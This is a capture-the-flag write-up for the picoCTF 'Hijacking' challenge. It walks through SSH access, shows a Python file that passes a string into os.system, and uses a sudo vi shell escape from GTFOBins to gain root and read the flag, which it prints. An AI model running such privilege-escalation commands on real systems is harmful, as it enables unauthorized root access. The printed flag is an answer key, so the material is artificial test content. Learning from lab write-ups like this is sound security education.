# Hijacking #

## Overview ##

200 points

Category: [Binary Exploitation](../)

Tags : `#privilege_escalation`

## Description ##
> Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server. Launch your own instance to get an ssh server.

### Solution ###

Let's play around with the ssh. After sshing, run a quick ls. This gives no output, so let's check for hidden files with the `-a` command, giving us:

`picoctf@challenge:~$ ls -a
.  ..  .bash_logout  .bashrc  .cache  .profile  .server.py`

As we can see, there is a Python file, so let's `cat` the file and see what is inside.

picoctf@challenge:~$ cat .server.py

import base64

import os

import socket

ip = 'picoctf.org'

response = os.system("ping -c 1 " + ip)

#saving ping details to a variable

host_info = socket.gethostbyaddr(ip)

#getting IP from a domaine

host_info_to_str = str(host_info[2])

host_info = base64.b64encode(host_info_to_str.encode('ascii'))

print("Hello, this is a part of information gathering",'Host: ', host_info)

Although this file will help in the challenge, I managed to find a unintended solution:

First, let's `cd` into the `/` directory and list the contents of the directory.

`picoctf@challenge:~$ cd /`

`picoctf@challenge:/$ ls -a
.  ..  .dockerenv  bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var`

As we can see, our end goal is to change into the root directory. Knowing that that `vi` command is available to us, we use GTFOBins to find possible exploits to gain root privileges.

https://gtfobins.github.io/gtfobins/vi/

Scrolling down to the vi section, we can see this command: `sudo vi -c ':!/bin/sh' /dev/null`

Input this into the terminal, and put in the password for picoctf that they give you with the instance. This should give you root privileges. Now, the challenge is simple: just `cd` into the `/` directory, then `cd` into the `root` directory.

Finally, run `ls -a` and you will see a text file named `.flag.txt`. Simply `cat` this file and you will get:

`picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}`
